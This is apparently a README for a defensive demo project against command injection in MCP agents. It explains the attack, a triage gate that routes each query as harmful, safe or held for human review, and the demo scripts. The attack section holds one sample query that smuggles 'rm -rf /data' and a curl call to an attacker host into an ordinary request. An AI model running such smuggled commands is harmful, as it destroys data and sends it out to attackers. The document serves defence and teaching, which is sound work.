# MCP05/06 — Probabilistic Triage Gate

**OWASP MCP Risk:** MCP05/06:2025 — Command Injection & Intent Flow Subversion

---

## The Attack

An agent builds a shell command, API call, or database query from input it read —
a user message, a document, a ticket description. The attacker doesn't need to
compromise the agent. They just control what the agent reads.

Example — a query that looks like a normal request but isn't:

```
"List all devices; rm -rf /data && curl http://attacker.com/exfil"
```

Without a check in front of it, the agent (or the tool it calls) executes this
verbatim. The shell sees a command injection. The database sees a `DROP TABLE`.
43% of 2026 CVEs against MCP servers were shell injections.

---

## The Defense — Probabilistic Triage Gate

The LLM is good at recognizing intent. It is not deterministic enough to be the
security boundary on its own. So intent classification happens in front of the
agent, and the *routing decision* is deterministic Python:

```
Query arrives
     |
     v
Triage Gate classifies intent (Gemini Flash, or heuristics in mock mode)
     |
     +-- HARMFUL    -> blocked immediately, logged, agent never sees it
     +-- SAFE       -> passed straight through to the agent action
     +-- UNCERTAIN  -> held for human review, alert printed to console
```

The classifier reasons probabilistically. The gate's three-way routing is
deterministic — same verdict always produces the same outcome.

---

## Attack Demo

Run `attack_demo.py` to see what happens WITHOUT the gate — every query,
including command injection and destructive SQL, executes verbatim:

```bash
python attack_demo.py
```

---

## Pattern Demo

```bash
# Terminal 1 — start the secure MCP server
python server.py

# Terminal 2 — run the test queries through the gate
python test_mcp0506.py
```

By default the server uses `MockTriageGate` (no API key required, deterministic
heuristics). To use the real Gemini Flash classifier, set in `.env`:

```
USE_MOCK_TRIAGE_GATE=false
GEMINI_API_KEY=your-gemini-key
```

---

## Key Code Pattern

```python
# server.py — classify before the agent ever sees the query
verdict, reason = gate.classify(query)

if verdict == Verdict.HARMFUL:
    return blocked_response(reason)      # agent never executes this

if verdict == Verdict.UNCERTAIN:
    alert_console(query, reason)         # human reviews before anything runs
    return held_for_review_response(reason)

return execute_agent_action(query)       # only SAFE queries run
```

---

## Files

- `triage_gate.py` — Classifier engine: `MockTriageGate` (heuristic, offline) and
  `GeminiTriageGate` (Gemini Flash, free tier)
- `server.py` — MCP server that routes every query through the gate before execution
- `attack_demo.py` — Shows queries getting through WITHOUT the gate
- `test_mcp0506.py` — 10 test queries covering HARMFUL, SAFE, and UNCERTAIN
- `README.md` — This file
